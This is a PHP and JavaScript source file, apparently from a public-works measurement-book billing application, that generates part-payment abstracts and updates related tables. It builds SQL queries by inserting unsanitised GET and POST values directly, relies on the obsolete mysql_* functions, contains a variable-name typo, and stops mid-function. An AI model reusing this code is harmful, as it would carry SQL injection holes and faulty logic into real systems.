<?php
//session_start();
@ob_start();
require_once 'library/config.php';
require_once 'library/functions.php'; 
require_once 'library/binddata.php'; 
checkUser();
include "library/common.php";
include "spellnumber.php";
$msg = ''; $Line = 0;
function dt_display($ddmmyyyy)
{
 $dt=explode('-',$ddmmyyyy);
 $dd=$dt[2];
 $mm=$dt[1];
 $yy=$dt[0];
 return $dd . '/' . $mm . '/' . $yy;
}
function checkPartpayment($DpmArrMbidList,$Key)
{
	$InitKey = $Key;
	while($perc = current($DpmArrMbidList)) 
	{
		if ($perc == $InitKey) 
		{
			//echo key($DpmArrPayPercentList).'<br />';
			$res .= key($DpmArrMbidList)."*";
		}
		next($DpmArrMbidList);
	}
	return rtrim($res,"*");
}

function removeArray($res,$array)
{
	$explodeRes = explode("*",rtrim($res,"*"));
	for($i=0; $i<count($explodeRes);$i++)
	{
		$RemKey = $explodeRes[$i];
		unset($array[$RemKey]);
	}
	return $array;
}
function CheckPageBreak($tablehead,$abstmbno,$table,$page)
{
	$nextpage = $page+1;
	$Output .= "<tr>
					<td colspan='3' align='right' class='labelbold'>C/o Page No ".$nextpage."/ Abstract MB No ".$abstmbno."</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
				</tr>";
	$Output .=  "<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page ".$page."</td></tr>";
	$Output .= "</table>";
	$Output .= "<p  style='page-break-after:always;'></p>";
	$Output .= '<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
				<tr style="border:none;"><td align="right" style="border:none;">Abstract M.Book No. '.$abstmbno.'&nbsp;&nbsp;</td></tr>
				</table>';
	$Output .= $table;
	$Output .= "<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>";
	$Output .= $tablehead;
	$Output .= "<tr>
					<td colspan='3' align='right' class='labelbold'>B/f from Page No ".$page."/ Abstract MB No ".$abstmbno."</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
				</tr>";
	echo $Output;
}

function UpdateItemAbstractPageNo($abstsheetid,$abstmbno,$subdivid,$page)
{
	$update_pageno_sql = "update measurementbook_temp set abstmbookno = '$abstmbno', abstmbpage = '$page' where sheetid	= '$abstsheetid' AND subdivid = '$subdivid'";
	$update_pageno_query = mysql_query($update_pageno_sql);
}
$staffid 		= 	$_SESSION['sid'];
$userid 		= 	$_SESSION['userid'];
$abstsheetid    = 	$_GET['workno'];
$_SESSION["abstsheetid"] = 	$_GET['workno'];
$abstsheetid    = 	$_SESSION["abstsheetid"];
//$rbn    		= 	$_SESSION["rbn"]; 
//$abstsheetid    = 	$_SESSION["abstsheetid"];   $abstmbno 	= 	$_SESSION["abs_mbno"];  $abstmbpage  	= 	$_SESSION["abs_page"];	
//$fromdate       = 	$_SESSION['fromdate'];      $todate   	= 	$_SESSION['todate'];    $abs_mbno_id 	= 	$_SESSION["abs_mbno_id"];
$selectmbook_detail = " select DISTINCT fromdate, todate, rbn, abstmbookno FROM mbookgenerate WHERE sheetid = '$abstsheetid'";
//echo $selectmbook_detail;
$selectmbook_detail_sql = mysql_query($selectmbook_detail);
if ($selectmbook_detail_sql == true) 
{
	$Listmbdetail 		= 	mysql_fetch_object($selectmbook_detail_sql);
	$fromdate 			= 	$Listmbdetail->fromdate; $todate = $Listmbdetail->todate; $rbn = $Listmbdetail->rbn; $abstmbno = $Listmbdetail->abstmbookno;
	$abstmbpage_query 	= 	"select mbpage, allotmentid from mbookallotment WHERE sheetid = '$abstsheetid' AND staffid = '$staffid' AND active = '1' AND mbno = '$abstmbno'";
	$abstmbpage_sql 	= 	mysql_query($abstmbpage_query);
	$Listmbook 			= 	mysql_fetch_object($abstmbpage_sql);
	$abstmbpage 		= 	$Listmbook->mbpage+1; $abs_mbno_id = $Listmbook->allotmentid;
}
$paymentpercent = 	$_SESSION["paymentpercent"];	$emptypage 	= $_SESSION['emptypage'];

if($emptypage == "")
{
	$emptypage = 0;
}
$empty_page_update_sql = "update mymbook set emptypage = '$emptypage' where sheetid = '$abstsheetid' and mbno = '$abstmbno' and  mtype = 'A' and rbn = '$rbn' and genlevel = 'abstract'";
$empty_page_update_query = mysql_query($empty_page_update_sql);


if($_POST["Submit"] == "Confirm")
{	
	
	
	$AbstractStr 			= 	$_POST['txt_abstractstr'];
	$SubdividSlmStr 		= 	$_POST['txt_subdivid_slmstr'];
	$runningbillno 			= 	$_POST['txt_rbn_no'];
	
	//$select_mymbook_sql = "select * from mymbook where sheetid = '$abstsheetid' and rbn = '$runningbillno' ORDER BY mtype, mbookorder ASC";
	//$select_mymbook_sql = "select distinct(mbno) as mbookno from mymbook a INNER JOIN (SELECT MAX(endpage), mbno AS maxpage
   // FROM mymbook) b ON where a.mbno = b.mbno and a.rbn = '$runningbillno' and a.sheetid = '$abstsheetid'";
	//$select_mymbook_sql = "select * from (SELECT distinct(mbno) FROM mymbook a where sheetid = '$abstsheetid' and rbn = '$runningbillno') mymbook";
	$select_mymbook_sql = "SELECT MAX(endpage) as maxpage, mbookorder, mbno FROM mymbook WHERE sheetid = '$abstsheetid' and rbn = '$runningbillno' GROUP BY mbno ORDER BY mbookorder ASC";
	$select_mymbook_query = mysql_query($select_mymbook_sql);
	//echo $select_mymbook_sql."<br/>";
	if(mysql_num_rows($select_mymbook_query)>0)
	{
		while($MBKList = mysql_fetch_object($select_mymbook_query))
		{
			$maxpage 	= $MBKList->maxpage;
			$mbook 		= $MBKList->mbno;
			if($maxpage == 100)
			{
				$update_mbookpage_sql_2 = "update agreementmbookallotment set active = 0 WHERE sheetid = '$abstsheetid' and mbno = '$mbook'";
				$update_mbookpage_query_2 = mysql_query($update_mbookpage_sql_2);
				
				$update_mbookpage_sql = "update mbookallotment set mbpage = '$maxpage', active = 0 WHERE sheetid = '$abstsheetid' and mbno = '$mbook'";
			}
			else
			{
				$update_mbookpage_sql = "update mbookallotment set mbpage = '$maxpage' WHERE sheetid = '$abstsheetid' and mbno = '$mbook'";
				//echo $update_mbookpage_sql."<br/>";
			}
			$update_mbookpage_query = mysql_query($update_mbookpage_sql);
		}
	}
	//exit;
	//echo $select_mymbook_sql;exit;
	if($SubdividSlmStr != "")
	{
		$explodeSubdividSlmStr	=	explode("*",rtrim($SubdividSlmStr,"*"));
		$explodeAbstractStr		=	explode("*",rtrim($AbstractStr,"*"));
		for($x7=0; $x7<count($explodeAbstractStr); $x7+=8)
		{
			$Divid_dmy			=	$explodeAbstractStr[$x7+0];
			$Subdivid_dmy		=	$explodeAbstractStr[$x7+1];
			$FromDate_dmy		=	$explodeAbstractStr[$x7+2];
			$ToDate_dmy			=	$explodeAbstractStr[$x7+3];
			$RbnNo_dmy			=	$explodeAbstractStr[$x7+4];
			$Sheetid_dmy		=	$explodeAbstractStr[$x7+5];
			$AMbookNo_dmy		=	$explodeAbstractStr[$x7+6];
			$AMbookPage_dmy		=	$explodeAbstractStr[$x7+7];
			$partpay_flag_dmy	=	"DMY";
			if(!in_array($Subdivid_dmy, $explodeSubdividSlmStr))
			{
				$insert_mbook_dummy_sql 	= 	"insert into 
												measurementbook (measurementbookdate, staffid, sheetid, divid, subdivid, fromdate, todate, abstmbookno, abstmbpage,  part_pay_flag, rbn, active, userid) 
												values (NOW(), '$staffid', '$Sheetid_dmy', '$Divid_dmy', '$Subdivid_dmy', '$FromDate_dmy', '$ToDate_dmy', '$AMbookNo_dmy', '$AMbookPage_dmy', '$partpay_flag_dmy', '$RbnNo_dmy', '1', '$userid')";
				$insert_mbook_dummy_query 	= 	mysql_query($insert_mbook_dummy_sql);
				//echo $insert_mbook_dummy_sql."<br/>";
			}
		}
	}
										//echo $insert_mbook_dummy_sql."<br/>";
										//echo $SubdividSlmStr."<br/>";
										//exit;

	$max_page_abs 			= 	$_POST['txt_maxpage'];
	$abstmbno 				= 	$_POST['txt_abstmbno'];
										//$mbook_start_page_abs 	= 	get_mbook_startpage($abstmbno,$abstsheetid);
										//$start_page_abs 		= 	explode('*', $mbook_start_page_abs);
										//$insert_mybmook_sql_3 	= 	"insert into mymbook set allotmentid = '$start_page_abs[1]', mbno = '$abstmbno', startpage = '$start_page_abs[0]', endpage = '$max_page_abs', sheetid = '$abstsheetid', staffid = '$staffid', rbn = '$rbn', active = 0, flag = 'A'";
										//$insert_mybmook_query_3 = 	mysql_query($insert_mybmook_sql_3);
	/*$update_asb_maxpage 	= 	"update mbookallotment set mbpage = '$max_page_abs' WHERE allotmentid	= '$abs_mbno_id' AND sheetid = '$abstsheetid'";
	$update_asb_maxpage_sql = 	mysql_query($update_asb_maxpage);
	$oldmbook_query 		= 	"SELECT * from oldmbook WHERE sheetid = '$abstsheetid'";
	$oldmbook_sql 			= 	mysql_query($oldmbook_query);
	if(mysql_num_rows($oldmbook_sql)>0)
	{
		while($res = mysql_fetch_array($oldmbook_sql))
		{
			$mbno 								= 	$res['mbname'];
			$mbooktype 							= 	$res['mbook_type'];
			$update_mbookallot_query 			= 	"UPDATE mbookallotment set active = '0' WHERE sheetid = '$abstsheetid' AND staffid = '$staffid' AND allotmentid = '".$res['old_id']."'";
			$update_mbookallot_sql 	 			= 	mysql_query($update_mbookallot_query);
			$update_aggreement_mbookallot_query = 	"UPDATE agreementmbookallotment set active = '0' WHERE sheetid = '$abstsheetid' AND allotmentid = '".$res['old_id']."'";
			$update_aggreement_mbookallot_sql 	= 	mysql_query($update_aggreement_mbookallot_query); 
			$oldmbook  		   				   .= 	$res['mbname']."*"; 
										//$mbook_start_page_old 				= 	get_mbook_startpage($mbno,$abstsheetid);
										//$start_page_old 					= 	explode('*', $mbook_start_page_old);
										//$insert_mybmook_sql 				= 	"insert into mymbook set allotmentid = '$start_page_old[1]', mbno = '$mbno', startpage = '$start_page_old[0]', endpage = '100', sheetid = '$abstsheetid', staffid = '$staffid', rbn = '$rbn', active = 0, flag = '$mbooktype'";	
										//$insert_mybmook_query 				= 	mysql_query($insert_mybmook_sql);
		} 
	} */
    $currentquantity 			= 	trim($_POST['currentquantity']);
	$mbookquery					=	"INSERT INTO measurementbook  (measurementbookdate, staffid, sheetid, divid, subdivid, fromdate, todate, mbno, mbnopages, mbpage, mbremainpage, mbtotalpages, mbquantity, mbtotal, abstmbookno, abstmbpage, abstquantity, absttotal, pay_percent, flag, part_pay_flag, rbn, active, userid, is_finalbill, remarks) SELECT  now(), staffid, sheetid, divid, subdivid, fromdate, todate, mbno, mbnopages, mbpage, mbremainpage, mbtotalpages, mbquantity, mbtotal, abstmbookno, abstmbpage, abstquantity, absttotal, pay_percent, flag, part_pay_flag, rbn, active, userid, is_finalbill, remarks FROM measurementbook_temp WHERE sheetid = '$abstsheetid'";// WHERE flag =1 OR flag = 2";
   	$mbooksql 					= 	mysql_query($mbookquery);   
    $sheetquery 				= 	"UPDATE sheet SET rbn = '$runningbillno' WHERE sheet_id ='$abstsheetid'";//AND STAFFID
    $sheetsql 					= 	dbQuery($sheetquery);
	
	
	
	/*$mbookpage_query 			= 	"select distinct mbno from mbookgenerate a WHERE NOT EXISTS(select mbname from oldmbook b WHERE a.mbno = b.mbname AND b.sheetid = '$abstsheetid') AND a.sheetid = '$abstsheetid'";
	$mbookpage_sql 				= 	mysql_query($mbookpage_query);
	while($result3 = mysql_fetch_array($mbookpage_sql))
	{
		$mbno 					= 	$result3['mbno'];
		$selectmaxpage_query 	= 	"select max(mbpage) from mbookgenerate WHERE sheetid	= '$abstsheetid' AND mbno ='".$result3['mbno']."'";
		$selectmaxpage_sql 		= 	mysql_query($selectmaxpage_query);
		$mbookmaxpage 			= 	@mysql_result($selectmaxpage_sql,'mbpage');
										//$mbook_start_page 		= 	get_mbook_startpage($mbno,$abstsheetid);
										//$strat_page 			= 	explode('*', $mbook_start_page);
										//$insert_mybmook_sql_2 	= 	"insert into mymbook set allotmentid = '$strat_page[1]', mbno = '$mbno', startpage = '$strat_page[0]', endpage = '$mbookmaxpage', sheetid = '$abstsheetid', staffid = '$staffid', rbn = '$rbn', active = 1, flag = '$mbooktype'";
										//$insert_mybmook_query_2 = 	mysql_query($insert_mybmook_sql_2);
		$upademaxpage_query 	= 	"update mbookallotment set mbpage = '$mbookmaxpage' WHERE sheetid = '$abstsheetid' AND mbno ='".$result3['mbno']."'";
		$upademaxpage_sql 		= 	mysql_query($upademaxpage_query);
	}*/
	
	
	/*if($select_mymbook_query == true)
	{
		
	}*/
	
	
	
	$newmbooksql 				= 	"DELETE FROM oldmbook WHERE sheetid = '$abstsheetid'";// DELETE NEW MBOOK TABLE
	$result1 					= 	dbQuery($newmbooksql);
	$mbookgeneratedelsql		= 	"DELETE FROM mbookgenerate WHERE sheetid ='$abstsheetid'"; //DELETE MBOOK GENERATE TABLE
    $result2 					= 	dbQuery($mbookgeneratedelsql);
	$mbooktempdelsql 			= 	"DELETE FROM measurementbook_temp WHERE sheetid ='$abstsheetid'"; //DELETE MBOOK TEMP TABLE
    $result3 					= 	dbQuery($mbooktempdelsql);
	if($is_finalbill == "Y")
	{
		$deactivate_sheet_query = 	"update sheet set active = '0' WHERE sheet_id = '$abstsheetid'";
		$deactivate_sheet_sql 	= 	mysql_query($deactivate_sheet_query);
	}
	header('Location: AbsGenerate_Partpay.php');
}

// Commented on 29.12.2016 by Prabasingh for Double time stored in mesaurement book table

/*$checkPartpay_sql 	= 	"select * from measurementbook_temp where sheetid = '$abstsheetid'";
$checkPartpay_query = 	mysql_query($checkPartpay_sql);
if(mysql_num_rows($checkPartpay_query)>0)
{
	$check = 1;
}
else
{
	$check = 0;
	$insermbook_temp_sql 	= 	"INSERT INTO measurementbook_temp (measurementbookdate, staffid, sheetid, divid, subdivid, fromdate, todate, mbno, mbpage, mbtotal, abstmbookno, abstmbpage,  pay_percent, flag, part_pay_flag, rbn, active, userid, is_finalbill)
SELECT mbgeneratedate, staffid, sheetid, divid, subdivid, fromdate, todate, mbno, mbpage, mbtotal, abstmbookno, abstmbpage,  '100', flag, 0, rbn, active, userid, is_finalbill FROM mbookgenerate where mbookgenerate.sheetid = '$abstsheetid'";
$insermbook_temp_query 		= 	mysql_query($insermbook_temp_sql);
}*/


$query 		= 	"SELECT    sheet_id, sheet_name, work_order_no, work_name, short_name, tech_sanction, computer_code_no, name_contractor, agree_no, rbn, rebate_percent FROM sheet WHERE sheet_id ='$abstsheetid' ";
$sqlquery 	= 	mysql_query($query);
if ($sqlquery == true) 
{
    $List 					= 	mysql_fetch_object($sqlquery);
    $work_name 				= 	$List->work_name; 
	$short_name 			= 	$List->short_name;   
	$tech_sanction 			= 	$List->tech_sanction;  
    $name_contractor 		= 	$List->name_contractor; 
	$ccno 					= 	$List->computer_code_no;    
	$agree_no 				= 	$List->agree_no; 
	$overall_rebate_perc 	= 	$List->rebate_percent; 
	$runn_acc_bill_no 		= 	$rbn;
	$work_order_no 			= 	$List->work_order_no; /*   if($List->rbn == 0){$runn_acc_bill_no =1;  } else { $runn_acc_bill_no=$List->rbn +1;}*/
	$length1 				= 	strlen($work_name);
 	$start_line1 			= 	ceil($length1/70); 
	$length2 				= 	strlen($agree_no);
	$start_line2 			= 	ceil($length2/27);  
	$LineIncr 				= 	$start_line1 + $start_line2 + 2 + 2; 
}
$Line = $Line + $LineIncr;
//echo $LineIncr;
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <title>Abstrack MBook</title>
    <link rel="stylesheet" href="script/font.css" />
</head>
	<script language="javascript" type="text/javascript" src="script/Date_Calendar.js"></script>
	<script language="javascript" type="text/javascript" src="script/validfn.js"></script>
	<link rel="stylesheet" href="css/button_style.css"></link>
	<link rel="stylesheet" href="js/jquery-ui.css">
	<script src="js/jquery-1.10.2.js"></script>
	<script src="js/jquery-ui.js"></script>
	<link rel="stylesheet" href="/resources/demos/style.css">
	<link rel="stylesheet" href="Font style/font.css" />
	<link type='text/css' href='css/basic.css' rel='stylesheet' media='screen' />
	<script type='text/javascript' src='js/basic_model_jquery.js'></script>
	<script type='text/javascript' src='js/jquery.simplemodal.js'></script>
	<link rel="stylesheet" href="css/font-awesome.css" />
	<!--<script type='text/javascript' src='js/basic.js'></script>-->
	<script src="dist/sweetalert-dev.js"></script>
	<link rel="stylesheet" href="dist/sweetalert.css">
<script type="text/javascript" language="javascript">
	function goBack()
	{
		url = "AbstractBookPrint_Common.php";
		window.location.replace(url);
	}
	function ValidatePercent(obj,section,idcount)
	{
		//alert(idcount);
		var value = obj.value;
		if(Number(value)>100)
		{
			swal("", "Entered % should be less than 100..!", "error"); 
			obj.value = "";
			document.getElementById("hid_slm_result"+idcount).value = "";
			totalAmountCalculation("slm");
			return false;
		}
		if(section == "dpm")
		{
			var paid_percent_dpm = document.getElementById("txt_partpay_percent_dpm"+idcount).value;
			var remain_percent_dpm = 100-Number(paid_percent_dpm);
			if(value > remain_percent_dpm)
			{
				swal("Entered Percentage should be less than: ", remain_percent_dpm+" %", "error");
				obj.value = "";
				document.getElementById("txt_amt_dpm_payable"+idcount).value = "";
				document.getElementById("hid_dpm_result"+idcount).value = "";
				totalAmountCalculation("dpm");
				return false;
			}
		}
	}
	function ValidateSlm()
	{
		var slmqty = document.getElementById("hid_slm_qty").value;
		var qty = 0;
		$('input[name="txt_partpay_qty_slm[]"]').each(function() {
			var currentqty = $(this).val();
			qty = (Number(qty)+Number(currentqty));
			if(qty>slmqty)
			{
				swal("", "Quantity Not Allowed..:)", "error"); 
				//$(this).val() = "";
				//return false;    updated on 03.11.2016
			}
		});
	}
	function setRowSpan() 
	{
		var i;
		var rowcount =  document.getElementById("table_group_count").value;
		for(i=0; i<rowcount; i++)
		{
			var row_span = document.getElementById("row_count"+i).value;
			document.getElementById("td_popupbutton"+i).rowSpan = row_span;
			var ht = document.getElementById("td_popupbutton"+i);
			 var checkbox_height = ht.offsetHeight;
			 //document.getElementById('ch_item'+i).offsetHeight = checkbox_height;
			 document.getElementById("ch_item"+i).style.height = checkbox_height+"px";
			 //document.getElementById("ch_item"+i).style.width = checkbox_height+"px";
			
		}
	}
	//var index = 1;
	function addRow()
	{
		var x = Number(document.getElementById("table4").rows.length);
		 	 index = x;
		//var arg = "X"+"*"+index;
		var rate = document.getElementById("txt_item_rate_slm0").value;
		var table=document.getElementById("table4");
        var row=table.insertRow(table.rows.length-2);
        	row.id = "rowid"+index;
			row.style.align = "center";
			
		var cell1=row.insertCell(0);
			cell1.setAttribute('class', "dynamicrowcell");
			cell1.style.padding = "0px 0px 0px 0px";
				
		var txt_box1 = document.createElement("input");
			txt_box1.name = "txt_partpay_qty_slm[]";
            txt_box1.id = "txt_partpay_qty_slm"+index;
			//txt_box1.value = row.id;
			txt_box1.style.width = 93+"px";
			txt_box1.style.border = "1px solid #2aade4";
			txt_box1.style.textAlign = "right";
			txt_box1.setAttribute('class', "dynamictextbox"); 
            cell1.appendChild(txt_box1);
			/*txt_box1.onblur= function () {
								ValidateSlm();
                        	  calculateAmount(this,index,"qty","slm")
                    		}*/
							txt_box1.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"qty","slm")
												ValidateSlm();
												};
											})(index); 
		var cell2=row.insertCell(1);
			cell2.setAttribute('class', "dynamicrowcell");	
			cell2.style.padding = "0px 0px 0px 0px";
		var txt_box2 = document.createElement("input");
			txt_box2.name = "txt_item_rate_slm";
            txt_box2.id = "txt_item_rate_slm"+index;
			txt_box2.value = Number(rate).toFixed(2);
			txt_box2.style.textAlign = "right";
			txt_box2.style.width = 80+"px";
			//txt_box2.readOnly = true;
			txt_box2.setAttribute('class', "dynamictextbox"); 
            cell2.appendChild(txt_box2);
			/*txt_box2.onblur= function () {
                        	  calculateAmount(this,index,"rate","slm")
                    		}*/
							txt_box2.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"rate","slm")
												ValidateSlm();
												};
											})(index); 
		var cell3=row.insertCell(2);
			cell3.setAttribute('class', "dynamicrowcell");	
			cell3.style.padding = "0px 0px 0px 0px";
		var txt_box3 = document.createElement("input");
			txt_box3.name = "txt_partpay_percent_slm";
            txt_box3.id = "txt_partpay_percent_slm"+index;
			//txt_box3.value = txt_box3.id;
			txt_box3.style.width = 40+"px";
			txt_box3.style.textAlign = "right";
			txt_box3.style.border = "1px solid #2aade4";
			txt_box3.setAttribute('class', "dynamictextbox"); 
			/*txt_box3.onblur= function () {
                        	  calculateAmount(this,index,"percent","slm");
							  ValidatePercent(this)
                    		}*/
							txt_box3.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","slm")
												ValidatePercent(this,"slm",ind);
												};
											})(index);
            cell3.appendChild(txt_box3);
							
		var cell4=row.insertCell(3);
			cell4.setAttribute('class', "dynamicrowcell");	
			cell4.style.padding = "0px 0px 0px 0px";
		var txt_box4 = document.createElement("input");
			txt_box4.name = "txt_partpay_amt_slm[]";
            txt_box4.id = "txt_partpay_amt_slm"+index;
			txt_box4.style.width = 130+"px";
			txt_box4.style.textAlign = "right";
			txt_box4.style.pointerEvents = "none";
			txt_box4.setAttribute('class', "dynamictextbox"); 
            cell4.appendChild(txt_box4);
		
		var cell5=row.insertCell(4);
			//cell5.style.width = 10+"px";
			cell5.style.textAlign = "center";
			cell5.style.padding = "0px 0px 0px 0px";
        var delbtn=document.createElement("input");
        	delbtn.type = "button";
        	delbtn.value = " X ";
        	delbtn.id = "btn_delete"+index;
			delbtn.name = "btn_delete";
			delbtn.setAttribute('class', "delbtnstyle");
			delbtn.style.width = 32+"px";
			delbtn.style.borderRadius = 0+"px";
        	delbtn.onclick = function () {
                        	  deleteRow(this);
                    		}
        	cell5.appendChild(delbtn);
			
			//var cell6=row.insertCell(5);
			//cell5.style.width = 10+"px";
			//cell6.style.textAlign = "center";
			//cell6.style.padding = "0px 0px 0px 0px";
			//cell6style.visibility = "hidden";	
			
	// BELOW FIELD IS HIDDEN BOX FIELD....SO APPEND IN ADD & DELETE BUTTON FIELD ITSELF..No seperate TD(cell) creation for this. check above ( index++ : line)
		var txt_box5 = document.createElement("input");
        	txt_box5.type = "hidden";
        	txt_box5.id = "hid_slm_result"+index;
			txt_box5.name = "hid_slm_result[]";
			txt_box5.setAttribute('class', "dynamictextbox");
			txt_box5.style.width = 70+"px";
			txt_box5.style.borderRadius = 0+"px";
			cell5.appendChild(txt_box5);
			index++;
	}
	function deleteRow(obj) 
	{
	   //var row = document.getElementById(id);
	   //row.parentNode.removeChild(row);
	   /*$('input[name = "btn_delete"]').click(function(){
		   $(this).closest('tr').remove()
		})*/
		var tr = $(obj).closest('tr');
		tr.remove();
	   totalAmountCalculation("slm");
	   return true;
	}
	function calculateAmount(obj,id,type,section)
	{
		var idcount = id;
		var currentvalue = obj.value;
		var itemid = document.getElementById("txt_item_id").value;
		var currentrbn = document.getElementById("txt_rab_no").value;
		if(section == "slm")
		{
			if(type == "qty")
			{
				var rate = document.getElementById("txt_item_rate_slm"+idcount).value;
				var percent = document.getElementById("txt_partpay_percent_slm"+idcount).value;
				var qty = currentvalue;
				//alert(percent)
			}
			if(type == "rate")
			{
				var qty = document.getElementById("txt_partpay_qty_slm"+idcount).value;
				var percent = document.getElementById("txt_partpay_percent_slm"+idcount).value;
				var rate = currentvalue;
			}
			if(type == "percent")
			{
				var rate = document.getElementById("txt_item_rate_slm"+idcount).value;
				var qty = document.getElementById("txt_partpay_qty_slm"+idcount).value;
				var percent = currentvalue;
			}
			qty = Number(qty);
			//alert(qty)
			rate = Number(rate);
			//alert(rate)
			percent = Number(percent);
			//alert(percent)
			if((qty != "") && (rate != "") && (percent != ""))
			{
				var amount = qty * rate * percent / 100;
				document.getElementById("txt_partpay_amt_slm"+idcount).value = Number(amount).toFixed(2);
				var result = percent + "*" + currentrbn + "*" + qty + "*" + itemid;
				document.getElementById("hid_slm_result"+idcount).value = result;
			}
			else
			{
				// Added on 03.02.2017 for 0% payment for SLM item
				var amount = 0;//qty * rate * percent / 100;
				document.getElementById("txt_partpay_amt_slm"+idcount).value = 0;//Number(amount).toFixed(2);
				var result = percent + "*" + currentrbn + "*" + qty + "*" + itemid;
				document.getElementById("hid_slm_result"+idcount).value = result;
				//document.getElementById("txt_partpay_amt_slm"+idcount).value = "";
				//document.getElementById("hid_slm_result"+idcount).value = "";
			}
		}
		if(section == "dpm")
		{
			var rate_dpm 	= document.getElementById("txt_item_rate_dpm"+idcount).value;
			var qty_dpm 	= document.getElementById("txt_partpay_qty_dpm"+idcount).value;
			var rbn_dpm 	= document.getElementById("txt_rbn_dpm"+idcount).value;
			var mbid_dpm 	= document.getElementById("hid_dpm_mbid"+idcount).value;
			var percent_dpm = currentvalue;
				qty_dpm 	= Number(qty_dpm);
				rate_dpm 	= Number(rate_dpm);
				percent_dpm = Number(percent_dpm);
			if((qty_dpm != "") && (rate_dpm != "") && (percent_dpm != ""))
			{
				var amount_dpm = qty_dpm * rate_dpm * percent_dpm / 100;
				document.getElementById("txt_amt_dpm_payable"+idcount).value = Number(amount_dpm).toFixed(2);
				var result = percent_dpm + "*" + currentrbn + "*" + qty_dpm + "*" + itemid + "*" + rbn_dpm + "*" + mbid_dpm;
				//alert(result)
				document.getElementById("hid_dpm_result"+idcount).value = result;
			}
			else
			{
				document.getElementById("txt_amt_dpm_payable"+idcount).value = "";
				document.getElementById("hid_dpm_result"+idcount).value = "";
			}
		}
		totalAmountCalculation(section);
		
		return true;
	}
	
	function totalAmountCalculation(section)
	{
		var amount = 0;
		if(section == "slm")
		{
			$('input[name="txt_partpay_amt_slm[]"]').each(function() {
				var amt = $(this).val();
				amount = (Number(amount)+Number(amt));
			});
			
			var DpmPayableAmount = document.getElementById("txt_partpay_total_payableamt_dpm").value;
			//if(DpmPayableAmount == ""){ DpmPayableAmount = 0; }
			var OverAllAmount = Number(amount)+Number(DpmPayableAmount);
			
			if(amount>0)
			{
				document.getElementById("txt_partpay_total_amt_slm").value = Number(amount).toFixed(2);
			}
			else
			{
				document.getElementById("txt_partpay_total_amt_slm").value = "";
			}
			document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);
		}
		if(section == "dpm")
		{
			$('input[name="txt_amt_dpm_payable[]"]').each(function() {
				var amt = $(this).val();
				amount = (Number(amount)+Number(amt));
			});
			
			var SlmTotalAmount = document.getElementById("txt_partpay_total_amt_slm").value;
			//if(SlmTotalAmount == ""){ SlmTotalAmount = 0; }
			var OverAllAmount = Number(amount)+Number(SlmTotalAmount);
			
			if(amount>0)
			{
				document.getElementById("txt_partpay_total_payableamt_dpm").value = Number(amount).toFixed(2);
			}
			else
			{
				document.getElementById("txt_partpay_total_payableamt_dpm").value = "";
			}
			document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);
		}
	}
	
	function getDPMdetaiils(sheetid,itemid,rate)
	{
		var xmlHttp;
		var data;
		var i, rbn, qty, percent, measurementbookid, searchflag, RemarkData ="", newrow = "",TotalPaidDpmAmount = 0,TotalPayableDpmAmount = 0; 
		var currentrbn = document.getElementById("txt_rab_no").value;
		var rate = Number(rate);	
		var dpmitemQty = document.getElementById("hid_dpm_qty").value;
		if(Number(dpmitemQty) == 0)
		{
			document.getElementById("dpmheadrow1").className 	= "hide";
			document.getElementById("dpmheadrow2").className 	= "hide";
			document.getElementById("dpmtotalrow").className 	= "hide";
			document.getElementById("dpmremarksrow").className 	= "hide";
		}
		else
		{
			document.getElementById("dpmheadrow1").className 	= "";
			document.getElementById("dpmheadrow2").className 	= "";
			document.getElementById("dpmtotalrow").className	= "";
			document.getElementById("dpmremarksrow").className 	= "";
		}
		if(window.XMLHttpRequest) // For Mozilla, Safari, ...
		{
			xmlHttp = new XMLHttpRequest();
		}
		else if(window.ActiveXObject) // For Internet Explorer
		{ 
			xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
		}
		strURL="find_dpm_details.php?sheetid="+sheetid+"&itemid="+itemid;
		xmlHttp.open('POST', strURL, true);
		xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xmlHttp.onreadystatechange = function()
		{
			if (xmlHttp.readyState == 4)
			{
				data=xmlHttp.responseText;
				if(data != "")
				{
					var details = data.split("*");
					var index = 1;
					for(i=0; i<details.length; i+=6)
					{
						RemarkData = ""; 
						rbn 				= details[i];
						qty 				= details[i+1];
						percent 			= details[i+2];
						measurementbookid 	= details[i+3];
						searchflag 			= details[i+4];
						PayableDpmSlmPercent 		= details[i+5];
						if((PayableDpmSlmPercent != "") && (PayableDpmSlmPercent != "X"))
						{
							var PayableSlmDpmAmt = Number(qty)*Number(PayableDpmSlmPercent)*Number(rate)/100;
								TotalPayableDpmAmount = (Number(TotalPayableDpmiAmount)+Number(PayableSlmDpmAmt));
							var result = PayableDpmSlmPercent + "*" + currentrbn + "*" + qty + "*" + itemid + "*" + rbn + "*" + measurementbookid;
						}
						else
						{
							var PayableSlmDpmAmt = 0;
							var result = "";
						}
						//alert(searchflag)
						
						
						if((searchflag != "") && (searchflag != "X"))
						{
							var searchflagdetails = searchflag.split("@");
							
								RemarkData  = "<table style='color:blue;font-family:verdana;font-size:13px;' class='table1' align='center' width='80%' bgcolor=''>";
